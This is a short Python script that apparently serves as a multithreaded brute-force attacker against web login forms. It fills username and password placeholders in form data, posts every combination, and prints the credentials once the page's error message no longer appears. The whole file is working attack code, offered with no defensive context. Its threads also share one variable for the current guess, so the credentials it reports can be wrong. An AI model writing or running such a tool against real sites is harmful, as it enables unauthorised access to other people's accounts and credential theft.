from requests import *
from threading import Thread,activeCount
from colorama import Fore
import sys
import time


class Http_Post:
    def __init__(self, url, username, password, data, err, thr, cookies):
        self.url = url
        self.usernames = username
        self.passwords = password
        self.data = data
        self.err = err
        self.thr = thr
        self.cookies = cookies
        self.isdone = False
        self.start()

    def send(self):
        d = {}
        d.update(self.d)
        req = post(self.url,data=d,cookies=self.cookies)
        if(self.err not in req.text):
            self.isdone = True
            print(Fore.LIGHTGREEN_EX + f"\n[+] {d}")
            sys.exit()

    def start(self):
        print(Fore.GREEN + "[+] brute force started")
        for u in self.usernames:
            for p in self.passwords:
                if(self.isdone == True):
                    break
                if(activeCount()>=self.thr):
                    time.sleep(4)
                data = {}
                data.update(self.data)
                for key in self.data:
                    if(data[key] == "^USER^"):
                        data.update({key:u})
                    elif(data[key] == "^PWD^"):
                        data.update({key:p})
                self.d = data
                thr = Thread(target=self.send)
                thr.start()
            if(self.isdone == True):
                break
        print(Fore.LIGHTGREEN_EX + "[+] Finished")

